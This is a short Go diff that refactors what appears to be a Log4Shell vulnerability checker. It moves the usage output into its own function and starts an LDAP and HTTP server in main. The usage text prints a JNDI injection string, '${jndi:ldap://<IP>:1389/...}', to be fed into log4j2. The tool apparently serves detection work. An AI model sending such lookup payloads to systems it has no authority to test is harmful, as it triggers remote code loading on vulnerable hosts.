@@ -23,6 +23,18 @@ var jar embed.FS
 
 func main() {
 	printIpAddresses()
+	printUsage()
+	ldapServer := startLdapServer()
+	startHttpServer()
+
+	ch := make(chan os.Signal)
+	signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)
+	<-ch
+	close(ch)
+	ldapServer.Stop()
+}
+
+func printUsage() {
 	fmt.Println("Try to make log4j2 to print ${jndi:ldap://<IP>:1389/probably_not_vulnerable}")
 	fmt.Println("Example: ")
 	fmt.Println("----")
@@ -36,14 +48,6 @@ public class Main {
     }
 }`)
 	fmt.Println("----")
-	ldapServer := startLdapServer()
-	startHttpServer()
-
-	ch := make(chan os.Signal)
-	signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)
-	<-ch
-	close(ch)
-	ldapServer.Stop()
 }
 
 func startLdapServer() *ldap.Server {
